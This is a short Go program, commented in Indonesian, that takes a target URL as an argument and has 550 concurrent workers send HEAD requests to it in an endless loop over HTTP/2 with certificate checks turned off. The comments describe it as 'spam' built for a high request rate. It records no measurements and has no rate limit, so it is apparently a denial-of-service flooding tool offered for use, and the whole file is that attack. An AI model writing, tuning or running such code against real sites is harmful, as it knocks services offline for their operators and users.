package main
// Import Module
import (
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"
)

// Aman
const (
	workers        = 550
	requestTimeout = 3 * time.Second
	userAgent      = "curl/8.4.0" // versi ringan valid auto 200 true (curl/8.4.0)
)

// Sangat membantu memaksimalkan
func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

// Transport Http2 kecepatan rps high
func main() {
	if len(os.Args) < 2 {
		os.Exit(1)
	}
	targetURL := os.Args[1]
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		DisableKeepAlives:   false,
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 5000,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     60 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS13,
			MaxVersion:         tls.VersionTLS13,
			NextProtos:         []string{"h2"},
		},
		ForceAttemptHTTP2:     true,
		DisableCompression:    true,
		TLSHandshakeTimeout:   1 * time.Second,
		ResponseHeaderTimeout: 1 * time.Second,
		ExpectContinueTimeout: 0,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   requestTimeout,
	}

	// request template dipakai ulang
	req, _ := http.NewRequest("HEAD", targetURL, nil)
	req.Header.Set("User-Agent", userAgent)

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	// workers spam utamakan kecepatan 
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ctx.Err() == nil {
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}()
	}
	// exit
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	cancel()
	wg.Wait()
}
